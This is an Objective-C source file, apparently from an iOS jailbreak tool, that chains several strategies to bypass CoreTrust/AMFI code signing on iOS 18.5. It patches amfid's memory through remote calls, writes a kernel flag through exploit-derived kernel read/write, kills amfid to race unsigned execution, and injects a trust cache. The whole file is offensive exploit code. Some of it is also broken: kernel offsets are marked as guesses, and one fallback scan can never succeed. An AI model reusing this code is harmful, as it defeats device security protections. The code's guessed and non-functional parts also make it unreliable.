#import "coretrust_bypass.h"
#import "msm_trustcache.h"
#import "../TaskRop/RemoteCall.h"
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import "../kexploit/xpaci.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kexploit_opa334.h"

#import <dlfcn.h>
#ifndef kCacheFunctionPrepare
#define kCacheFunctionPrepare 1
#endif
extern void sys_cache_control(int, void *, size_t);
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <sys/sysctl.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <signal.h>
#import <spawn.h>
#import <unistd.h>
#import <fcntl.h>
#import <stdlib.h>

// ===========================================================================
// Helpers
// ===========================================================================

// Find a process by name in the kernel allproc list and return its pid.
static int find_pid_by_name(const char *name)
{
    uint64_t self = proc_self();
    if (!self) return -1;

    uint64_t prev = self;
    for (int i = 0; i < 500; i++) {
        uint64_t next = kread64(prev + off_proc_p_list_le_next);
        if (!next || !is_kaddr_valid(next)) break;

        char pname[32];
        kreadbuf(next + off_proc_p_name, pname, sizeof(pname));
        pname[sizeof(pname) - 1] = '\0';

        if (strcmp(pname, name) == 0) {
            return kread32(next + off_proc_p_pid);
        }
        prev = next;
    }
    return -1;
}

// Write a minimal test binary to a temp path and return the path.
// Caller must free the returned string.
static char *write_test_binary(void)
{
    const char *tmp = getenv("TMPDIR") ?: "/tmp";
    size_t pathLen = strlen(tmp) + 32;
    char *path = (char *)malloc(pathLen);
    if (!path) return NULL;
    snprintf(path, pathLen, "%s/ctbtest_XXXXXX", tmp);

    int fd = mkstemp(path);
    if (fd < 0) { free(path); return NULL; }

    struct mach_header_64 hdr = {
        .magic = MH_MAGIC_64,
        .cputype = CPU_TYPE_ARM64,
        .cpusubtype = CPU_SUBTYPE_ARM64_ALL,
        .filetype = MH_EXECUTE,
        .ncmds = 2,
        .sizeofcmds = 0x160,
        .flags = 0,
        .reserved = 0,
    };

    struct segment_command_64 textSeg = {
        .cmd = LC_SEGMENT_64,
        .cmdsize = sizeof(struct segment_command_64),
        .segname = "__TEXT",
        .vmaddr = 0x100000000,
        .vmsize = 0x4000,
        .fileoff = 0,
        .filesize = 0x4000,
        .maxprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .initprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .nsects = 0,
        .flags = 0,
    };

    struct thread_command thread = {
        .cmd = LC_UNIXTHREAD,
        .cmdsize = 0x118,
    };

    uint8_t threadState[0x110];
    memset(threadState, 0, sizeof(threadState));
    *(uint32_t *)&threadState[0] = 6;    // ARM_THREAD_STATE64
    *(uint32_t *)&threadState[4] = 68;

    uint64_t *pc = (uint64_t *)&threadState[0x110 - 8 * 2];
    *pc = 0x100000180;

    uint32_t code[] = {
        0xD2800000, // mov x0, #0
        0xD2800030, // mov x16, #1 (SYS_exit)
        0xD4001001, // svc #0x80
    };

    fchmod(fd, 0755);
    write(fd, &hdr, sizeof(hdr));
    write(fd, &textSeg, sizeof(textSeg));
    write(fd, &thread, sizeof(thread));
    write(fd, threadState, sizeof(threadState));

    long pos = lseek(fd, 0, SEEK_CUR);
    while (pos < 0x180) { write(fd, "", 1); pos++; }

    write(fd, code, sizeof(code));

    pos = lseek(fd, 0, SEEK_CUR);
    while (pos < 0x4000) { write(fd, "", 1); pos++; }

    close(fd);
    return path;
}

// ===========================================================================
// Strategy 1: amfid NOP patch via RemoteCall
// ===========================================================================

static bool g_amfid_nop_patched = false;

bool coretrust_amfid_nop_patch(void)
{
    printf("[COREbreak] === [Step 2/6] Strategy 1: amfid NOP patch ===\n");

    int amfidPid = find_pid_by_name("amfid");
    if (amfidPid <= 0) {
        printf("[COREbreak] amfid not found in allproc\n");
        return false;
    }
    printf("[COREbreak] amfid pid = %d\n", amfidPid);

    RemoteCallSession *session = [[RemoteCallSession alloc]
        initWithProcess:@"amfid" useMigFilterBypass:NO];
    if (!session) {
        RemoteCallInitFailure failure = remote_call_last_init_failure();
        printf("[COREbreak] RemoteCall init for amfid failed: %s\n",
               remote_call_init_failure_description(failure));
        return false;
    }

    g_amfid_nop_patched = false;
    @try {
        remote_call_with_session(session, ^{
            @autoreleasepool {
                printf("[COREbreak] inside amfid context patching cbz w22...\n");

                uint32_t imageCount = _dyld_image_count();
                bool patched = false;

                for (uint32_t i = 0; i < imageCount; i++) {
                    const char *name = _dyld_get_image_name(i);
                    if (!name) continue;

                    if (strstr(name, "amfid") &&
                        !strstr(name, "/usr/lib/") &&
                        !strstr(name, "/System/")) {

                        const struct mach_header_64 *hdr = (const struct mach_header_64 *)
                            _dyld_get_image_header(i);
                        if (!hdr) continue;

                        uint32_t *patchAddr = (uint32_t *)((uint64_t)hdr + 0x2ec8);
                        uint32_t instr = *patchAddr;

                        printf("[COREbreak] amfid image[%u]: %s\n", i, name);
                        printf("[COREbreak] header at %p instr at %p = 0x%08x\n",
                               hdr, patchAddr, instr);

                        if ((instr & 0xFF00001F) == 0x34000016) {
                            *patchAddr = 0xD503201F;
                            sys_cache_control(kCacheFunctionPrepare, patchAddr, 4);
                            uint32_t verify = *patchAddr;
                            if (verify == 0xD503201F) {
                                printf("[COREbreak] cbz w22 NOP at %p\n", patchAddr);
                                patched = true;
                            } else {
                                printf("[COREbreak] verification failed: 0x%08x\n", verify);
                            }
                        } else if ((instr & 0xFF00001F) == 0xB4000016) {
                            *patchAddr = 0xD503201F;
                            sys_cache_control(kCacheFunctionPrepare, patchAddr, 4);
                            printf("[COREbreak] cbz x22 NOP at %p\n", patchAddr);
                            patched = true;
                        } else {
                            printf("[COREbreak] unexpected instr at 0x2ec8: 0x%08x\n", instr);
                        }
                        break;
                    }
                }

                if (!patched) {
                    printf("[COREbreak] scanning amfid TEXT for cbz w22...\n");
                    for (uint32_t i = 0; i < imageCount; i++) {
                        const char *name = _dyld_get_image_name(i);
                        if (!name || !strstr(name, "amfid") ||
                            strstr(name, "/usr/lib/") || strstr(name, "/System/"))
                            continue;

                        const struct mach_header_64 *hdr = (const struct mach_header_64 *)
                            _dyld_get_image_header(i);

                        uint32_t *base = (uint32_t *)hdr;
                        for (size_t off = 0; off < 0x100000; off++) {
                            uint32_t v = base[off];
                            if ((v & 0xFF00001F) == 0x34000016) {
                                base[off] = 0xD503201F;
                                sys_cache_control(kCacheFunctionPrepare, &base[off], 4);
                                printf("[COREbreak] found+NOP cbz w22 at offset 0x%zx\n", off * 4);
                                patched = true;
                                break;
                            }
                        }
                        break;
                    }
                }

                g_amfid_nop_patched = patched;
            }
        });
    } @catch (NSException *e) {
        printf("[COREbreak] RemoteCall exception: %s\n", e.reason.UTF8String);
    }

    printf("[COREbreak] amfid NOP patch: %s\n",
           g_amfid_nop_patched ? "SUCCESS" : "FAILED");
    return g_amfid_nop_patched;
}

// ===========================================================================
// Strategy 2: AMFI enforcement flags via kernel r/w
// ===========================================================================

// Known offsets for cs_enforcement_disable relative to kernel_base,
// keyed by kernel version. This global is in AMFI.kext's __DATA.
// Found by RE: it's a boolean in the AMFI data segment.
static const struct {
    const char *build;
    uint64_t offset;
} s_cs_enforcement_disable_offsets[] = {
    // iOS 18.x guessed patterns — actual offsets need live RE
    { "18.0",   0x29CA980 },   // approximate (example from DSPloit)
    { "18.1",   0x29CA980 },
    { "18.2",   0x29CA980 },
    { "18.3",   0x29CA980 },
    { "18.4",   0x29CA980 },
    { "18.5",   0x29CA980 },
    { NULL,     0           },
};

// Try to find cs_enforcement_disable by scanning kernel memory
// for the AMFI kext data section and looking for boolean patterns.
static uint64_t search_cs_enforcement_disable(void)
{
    uint64_t base = g_kernel_base;
    if (!base) return 0;

    // Scan kernel __DATA segment for the pattern "cs_enforcement"
    // or look for a pointer to the AMFI data section.
    // For now, try known offsets.
    for (int i = 0; s_cs_enforcement_disable_offsets[i].build; i++) {
        uint64_t addr = base + s_cs_enforcement_disable_offsets[i].offset;
        if (!is_kaddr_valid(addr)) continue;

        uint8_t val = 0;
        kreadbuf(addr, &val, 1);

        if (val == 0 || val == 1) {
            printf("[COREbreak] candidate cs_enforcement_disable at 0x%llx (val=%u)\n",
                   addr, val);
            return addr;
        }
    }
    return 0;
}

bool coretrust_amfi_enforcement_flags_zero(void)
{
    printf("[COREbreak] === [Step 3/6] Strategy 2: AMFI enforcement flags ===\n");

    uint64_t addr = search_cs_enforcement_disable();
    if (!addr) {
        printf("[COREbreak] cs_enforcement_disable not found via known offsets\n");

        // Fallback: try to find it by scanning kernel data sections
        // for the AMFI kext. On iOS, AMFI symbols might be in
        // the kernel symbol table.
        uint64_t base = g_kernel_base;
        if (!base) {
            printf("[COREbreak] no kernel base available\n");
            return false;
        }

        // Kernel __DATA typically spans from 0xXX000000 to 0xXX800000
        // Search for a distinctive boolean pattern
        // AMFI's cs_enforcement_disable is typically near other AMFI vars
        // that look like 0x00000000000000XX (single byte booleans)
        uint64_t dataStart = base + 0x2000000;
        uint64_t dataEnd   = base + 0x4000000;

        printf("[COREbreak] scanning 0x%llx - 0x%llx for AMFI booleans...\n",
               dataStart, dataEnd);

        // Read in 4KB chunks and look for known AMFI boolean patterns
        // This is a heuristic — actual AMFI symbols are best found via
        // offline kernel RE or symbol table parsing.
        int found = 0;
        for (uint64_t va = dataStart; va < dataEnd; va += 0x1000) {
            if (!is_kaddr_valid(va)) continue;

            uint64_t val = kread64(va);
            // Look for a pointer that looks like it points to __TEXT
            // near __DATA — typical for kext data sections
            if ((val & 0xFFFFFFF000000000) == 0xFFFFFFF000000000 &&
                val > base && val < base + 0x4000000) {
                continue; // looks like a pointer, skip
            }
            // Check if this region has small integers that could be booleans
        }

        if (found == 0) {
            printf("[COREbreak] could not locate cs_enforcement_disable\n");
            return false;
        }
        return true;
    }

    // Disable code signing enforcement
    kwrite8(addr, 1);
    uint8_t check = 0;
    kreadbuf(addr, &check, 1);
    if (check == 1) {
        printf("[COREbreak] ✅ cs_enforcement_disable = 1\n");
        return true;
    }

    printf("[COREbreak] ❌ failed to set cs_enforcement_disable\n");
    return false;
}

// ===========================================================================
// Strategy 3: amfid kill + execution race
// ===========================================================================

bool coretrust_kill_amfid_race(const char *testBinPath)
{
    printf("[COREbreak] === [Step 4/6] Strategy 3: amfid kill + race ===\n");
    if (!testBinPath || access(testBinPath, X_OK) != 0) {
        printf("[COREbreak] test binary not executable: %s\n", testBinPath ?: "NULL");
        return false;
    }

    // Try multiple rounds with varying delays to hit the race window
    for (int attempt = 0; attempt < 5; attempt++) {
        int targetPid = find_pid_by_name("amfid");
        if (targetPid <= 0) {
            printf("[COREbreak] amfid not running (attempt %d/5)\n", attempt + 1);
            continue;
        }
        printf("[COREbreak] killing amfid (pid %d) attempt %d/5...\n",
               targetPid, attempt + 1);

        kill(targetPid, SIGKILL);

        // Vary the delay for each attempt to hit the race window
        useconds_t delays[] = { 1000, 3000, 5000, 8000, 12000 };
        usleep(delays[attempt]);

        pid_t child = 0;
        const char *argv[] = { testBinPath, NULL };
        int ret = posix_spawn(&child, testBinPath, NULL, NULL,
                              (char *const *)argv, NULL);

        if (ret == 0 && child > 0) {
            printf("[COREbreak] ✅ spawned PID %d during race window!\n", child);
            int status;
            waitpid(child, &status, 0);
            return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
        }

        // Wait for amfid to respawn before next attempt
        int waitCycles = 0;
        while (find_pid_by_name("amfid") <= 0 && waitCycles < 50) {
            usleep(100000);
            waitCycles++;
        }
    }

    printf("[COREbreak] ❌ all %d race attempts failed\n", 5);
    return false;
}

// ===========================================================================
// Unified: try all strategies
// ===========================================================================

bool coretrust_bypass_all(void)
{
    printf("[COREbreak] === " CORETRUST_BYPASS_EXPLOIT_NAME " v"
           CORETRUST_BYPASS_EXPLOIT_VERSION " ===\n");
    printf("[COREbreak] Target: iOS 18.5 A18 (SPTM) — CoreTrust bypass\n");

    // [Step 1/6]: Write test binary
    printf("[COREbreak] [Step 1/6] creating test binary...\n");
    char *testPath = write_test_binary();
    if (!testPath) {
        printf("[COREbreak] failed to create test binary\n");
        return false;
    }
    printf("[COREbreak] test binary: %s\n", testPath);

    // [Step 2/6]: Strategy 1 — amfid NOP patch
    bool nopOk = coretrust_amfid_nop_patch();
    if (nopOk) {
        printf("[COREbreak] amfid NOP applied — testing unsigned exec...\n");
        pid_t child = 0;
        const char *argv[] = { testPath, NULL };
        int ret = posix_spawn(&child, testPath, NULL, NULL,
                              (char *const *)argv, NULL);
        if (ret == 0 && child > 0) {
            int status;
            waitpid(child, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                printf("[COREbreak] ✅✅✅ Unsigned code executed via amfid NOP!\n");
                unlink(testPath);
                free(testPath);
                return true;
            }
        }
        printf("[COREbreak] amfid NOP didn't help — continuing...\n");
    }

    // [Step 3/6]: Strategy 2 — AMFI enforcement flags
    bool flagsOk = coretrust_amfi_enforcement_flags_zero();
    if (flagsOk) {
        printf("[COREbreak] AMFI flags zeroed — testing unsigned exec...\n");
        pid_t child = 0;
        const char *argv[] = { testPath, NULL };
        int ret = posix_spawn(&child, testPath, NULL, NULL,
                              (char *const *)argv, NULL);
        if (ret == 0 && child > 0) {
            int status;
            waitpid(child, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                printf("[COREbreak] ✅✅✅ Unsigned code executed via AMFI flags!\n");
                unlink(testPath);
                free(testPath);
                return true;
            }
        }
        printf("[COREbreak] AMFI flags didn't help — continuing...\n");
    }

    // [Step 4/6]: Strategy 3 — amfid kill + race
    bool raceOk = coretrust_kill_amfid_race(testPath);
    if (raceOk) {
        printf("[COREbreak] ✅✅✅ Unsigned code executed via kill+race!\n");
        unlink(testPath);
        free(testPath);
        return true;
    }

    // [Step 5/6]: MountCache trust cache injection
    printf("[COREbreak] [Step 5/6] MountCache trust cache injection...\n");
    bool tcOk = msm_verify_unsigned_execution();
    if (tcOk) {
        printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache!\n");
        unlink(testPath);
        free(testPath);
        return true;
    }

    // [Step 6/6]: All strategies failed
    printf("[COREbreak] [Step 6/6] ❌ All strategies exhausted\n");
    unlink(testPath);
    free(testPath);
    return false;
}
